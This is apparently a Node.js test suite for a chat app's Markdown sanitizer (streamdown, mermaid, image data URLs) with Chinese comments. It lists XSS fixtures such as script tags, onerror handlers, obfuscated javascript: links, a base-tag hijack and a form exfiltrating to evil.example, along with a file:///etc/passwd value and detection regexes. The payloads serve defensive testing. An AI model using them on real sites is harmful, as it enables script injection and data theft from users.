import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import path from "node:path";
import test from "node:test";
import { fileURLToPath } from "node:url";
import { renderToStaticMarkup } from "react-dom/server";
import * as jsxRuntime from "react/jsx-runtime";

import { createTsModuleLoader } from "../helpers/load-ts-module.mjs";

const guiRoot = path.resolve(fileURLToPath(new URL("../..", import.meta.url)));

// 真实 react/jsx-runtime + 真实 streamdown（sanitize 链不能被 mock 掉）。
// streamdown 与四个 @streamdown/* 插件均为 ESM-only（exports 仅 import 条件，
// 无法被 CJS loader 解析），因此测试文件用 ESM import 真实模块后映射进
// mock 表——整条 raw→sanitize→harden 管线端到端真实执行。SSR 下 mermaid
// 块只渲染占位（不在 effect 中调用 render），其 DOMPurify 职责由
// securityLevel 静态断言钉住。
const [streamdownNs, cjkNs, codeNs, mathNs, mermaidNs] = await Promise.all([
  import("streamdown"),
  import("@streamdown/cjk"),
  import("@streamdown/code"),
  import("@streamdown/math"),
  import("@streamdown/mermaid"),
]);

// ImagePreview 依赖链含 ESM-only 包（CJS loader 无法解析），且 ToolImages
// 在 previewOpen=false 时并不渲染它；icons.tsx 引 ~icons/*（loader 默认
// 结构 mock 不可渲染），均以 no-op 组件占位。
const imagePreviewPath = path.join(guiRoot, "src/components/chat/ImagePreview.tsx");
const iconsPath = path.join(guiRoot, "src/components/icons.tsx");

const renderLoader = createTsModuleLoader({
  mocks: {
    "react/jsx-runtime": jsxRuntime,
    "@tauri-apps/plugin-opener": {
      openUrl() {
        throw new Error("openUrl must never run during render-only XSS fixtures");
      },
    },
    streamdown: streamdownNs,
    "@streamdown/cjk": cjkNs,
    "@streamdown/code": codeNs,
    "@streamdown/math": mathNs,
    "@streamdown/mermaid": mermaidNs,
    [imagePreviewPath]: {
      ImagePreview: () => null,
    },
    [iconsPath]: {
      ImageOff: () => null,
      Loader2: () => null,
    },
  },
});

const { Markdown } = renderLoader.loadModule("src/components/Markdown.tsx");
const workspaceAssets = renderLoader.loadModule(
  "src/components/workspace-editor/workspaceMarkdownAssets.ts",
);
const imageDataUrl = renderLoader.loadModule("src/lib/chat/imageDataUrl.ts");

function renderMarkdown(content, props = {}) {
  return renderToStaticMarkup(jsxRuntime.jsx(Markdown, { content, ...props }));
}

// 可执行载荷的统一断言面。注意：不能全局禁止 <svg——应用自身组件
// （流式 code 折叠箭头等）会渲染受信 <svg>；攻击面是「用户输入带入」的
// 元素/属性，核心由 on*= 与协议两类模式覆盖。
const EXECUTABLE_PATTERNS = [
  /<script/i,
  /\son\w+\s*=/i,
  /javascript:/i,
  /vbscript:/i,
  /<iframe/i,
  /<object/i,
  /<embed/i,
  /<form/i,
  /<base/i,
  /<img/i,
];

function assertNoExecutables(html, caseName) {
  for (const pattern of EXECUTABLE_PATTERNS) {
    assert.doesNotMatch(html, pattern, `${caseName}: output must not match ${pattern}`);
  }
}

const CHAT_XSS_VECTORS = [
  { name: "raw script tag", markdown: "<script>alert(1)</script>" },
  { name: "img with error handler", markdown: '<img src="x" onerror="alert(1)">' },
  { name: "svg with load handler", markdown: '<svg onload="alert(1)"><circle /></svg>' },
  { name: "iframe embed", markdown: '<iframe src="https://evil.example/"></iframe>' },
  {
    name: "object and embed",
    markdown: '<object data="https://evil.example/x"></object><embed src="https://evil.example/y">',
  },
  {
    name: "exfiltration form",
    markdown: '<form action="https://evil.example/collect"><button>go</button></form>',
  },
  { name: "base hijack", markdown: '<base href="https://evil.example/">' },
  { name: "mathml script vector", markdown: "<math><mtext><script>alert(1)</script></mtext></math>" },
  { name: "markdown link javascript", markdown: "[click](javascript:alert(1))" },
  { name: "raw anchor javascript", markdown: '<a href="javascript:alert(1)">click</a>' },
  { name: "vbscript href", markdown: '<a href="vbscript:msgbox(1)">click</a>' },
  {
    name: "data href",
    markdown: '<a href="data:text/html,<script>alert(1)</script>">click</a>',
  },
  {
    name: "html entity encoded scheme",
    markdown: '<a href="&#106;avascript:alert(1)">click</a>',
  },
  { name: "tab obfuscated scheme", markdown: '<a href="java\tscript:alert(1)">click</a>' },
  { name: "mixed case scheme", markdown: '<a href="JaVaScRiPt:alert(1)">click</a>' },
  {
    name: "markdown image with data svg",
    markdown: "![x](data:image/svg+xml;base64,PHN2Zz48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+PC9zdmc+)",
  },
  { name: "protocol relative url", markdown: "[x](//evil.example/x)" },
  {
    name: "mermaid label with html",
    markdown: '```mermaid\ngraph TD;\n  A["<img src=x onerror=alert(1)>"]\n```',
  },
];

test("chat markdown chain strips every executable vector", () => {
  for (const fixture of CHAT_XSS_VECTORS) {
    const html = renderMarkdown(fixture.markdown);
    assertNoExecutables(html, fixture.name);
  }
});

test("chat markdown renders links as handled buttons without exposing hrefs", () => {
  // streamdown 的 linkSafety 模式把 <a> 渲染为无 href 的 button（点击经 JS
  // 走 ExternalLinkModal 确认后才 openUrl）——危险协议即使过了 sanitize，
  // 也不会以 href 形式出现在 DOM 中；此处钉住「无 href/无事件属性」。
  const html = renderMarkdown(
    "[a](https://example.com/a) [b](mailto:hi@example.com) [c](tel:+8613800138000)",
  );
  assert.equal((html.match(/data-streamdown="link"/g) ?? []).length, 3);
  assert.match(html, />a<\/button> <button[^>]*>b<\/button> <button[^>]*>c<\/button>/);
  assert.doesNotMatch(html, /href=/);
  assertNoExecutables(html, "allowlisted protocols");
});

test("readOnly markdown renders links without href or handlers", () => {
  const html = renderMarkdown('<a href="https://evil.example/x">see</a>', { readOnly: true });
  assert.match(html, /see/);
  assert.doesNotMatch(html, /href=/);
  assertNoExecutables(html, "readOnly link");
});

test("workspace preview chain strips javascript links even without harden", () => {
  const html = renderMarkdown("[click](javascript:alert(1))", { preserveRelativeUrls: true });
  assertNoExecutables(html, "workspace javascript link");
  assert.doesNotMatch(html, /href=/);
});

test("workspace preview chain never emits real img elements", () => {
  const html = renderMarkdown(
    '<img src="data:image/svg+xml;base64,PHN2Zy8+"> ![x](data:image/png;base64,aGVsbG8=)',
    { preserveRelativeUrls: true },
  );
  assertNoExecutables(html, "workspace data image");
  assert.doesNotMatch(html, /<img/i);
});

test("workspace link classification neutralizes script schemes", () => {
  const classify = workspaceAssets.classifyWorkspaceMarkdownTarget;
  assert.deepEqual(classify("dir/a.md", "javascript:alert(1)"), { kind: "unsupported" });
  assert.deepEqual(classify("dir/a.md", "vbscript:msgbox(1)"), { kind: "unsupported" });
  assert.deepEqual(classify("dir/a.md", "file:///etc/passwd"), { kind: "unsupported" });
  assert.deepEqual(classify("dir/a.md", "data:image/svg+xml;base64,x"), {
    kind: "inline",
    url: "data:image/svg+xml;base64,x",
  });
  assert.deepEqual(classify("dir/a.md", "blob:https://host/x"), {
    kind: "inline",
    url: "blob:https://host/x",
  });
  assert.deepEqual(classify("dir/a.md", "//evil.example/x.png"), {
    kind: "external",
    url: "https://evil.example/x.png",
  });
  assert.deepEqual(classify("dir/a.md", "https://evil.example/x.png"), {
    kind: "external",
    url: "https://evil.example/x.png",
  });
  assert.deepEqual(classify("dir/a.md", "mailto:a@b.com"), {
    kind: "external",
    url: "mailto:a@b.com",
  });
  assert.deepEqual(classify("dir/a.md", "#heading"), { kind: "hash", fragment: "heading" });
  assert.deepEqual(classify("dir/a.md", "docs/guide.md"), {
    kind: "workspace",
    path: "dir/docs/guide.md",
  });
});

test("data: URL builder only accepts image mime types", () => {
  assert.equal(
    imageDataUrl.buildSafeImageDataUrl("image/svg+xml", "AAA"),
    "data:image/svg+xml;base64,AAA",
  );
  assert.equal(
    imageDataUrl.buildSafeImageDataUrl("image/png;charset=utf-8", "AAA"),
    "data:image/png;base64,AAA",
  );
  assert.equal(imageDataUrl.buildSafeImageDataUrl("image/png", "AAA"), "data:image/png;base64,AAA");
  assert.equal(imageDataUrl.buildSafeImageDataUrl("text/html", "AAA"), null);
  assert.equal(imageDataUrl.buildSafeImageDataUrl("application/xhtml+xml", "AAA"), null);
  assert.equal(imageDataUrl.buildSafeImageDataUrl("application/octet-stream", "AAA"), null);
  // 原始串可含空白/参数，但构造时按规范化 MIME 处理，不把不可信文本拼进 URL。
  assert.equal(
    imageDataUrl.buildSafeImageDataUrl("  IMAGE/PNG ; extra", "AAA"),
    "data:IMAGE/PNG;base64,AAA",
  );
});

test("mermaid stays pinned to strict security level", () => {
  const mermaidDist = readFileSync(
    path.join(guiRoot, "node_modules/@streamdown/mermaid/dist/index.js"),
    "utf8",
  );
  assert.match(mermaidDist, /securityLevel\s*:\s*"strict"/);
  const markdownSource = readFileSync(path.join(guiRoot, "src/components/Markdown.tsx"), "utf8");
  assert.doesNotMatch(markdownSource, /securityLevel/, "Markdown.tsx must not relax the default");
});

const toolImages = renderLoader.loadModule(
  "src/pages/chat/components/assistant-bubble/ToolImages.tsx",
);

test("tool images render svg data urls inside an inert img only", () => {
  const html = renderToStaticMarkup(
    jsxRuntime.jsx(toolImages.ToolResultImagePreview, {
      image: { type: "image", mimeType: "image/svg+xml", data: "PHN2Zy8+" },
      alt: "chart",
      id: "img-1",
      sizeBytes: 8,
    }),
  );
  assert.match(html, /src="data:image\/svg\+xml;base64,PHN2Zy8\+"/);
  assert.doesNotMatch(html, /on\w+\s*=|javascript:|<script/i);
});

test("tool images reject non-image mime types", () => {
  for (const mimeType of ["text/html", "application/xhtml+xml", "application/octet-stream"]) {
    const html = renderToStaticMarkup(
      jsxRuntime.jsx(toolImages.ToolResultImagePreview, {
        image: { type: "image", mimeType, data: "PHN2Zy8+" },
        alt: "chart",
        id: "img-1",
      }),
    );
    assert.doesNotMatch(html, /<img/i, `${mimeType} must not render an img`);
    assert.doesNotMatch(html, / data:/i, `${mimeType} must not produce a data: URL`);
  }
});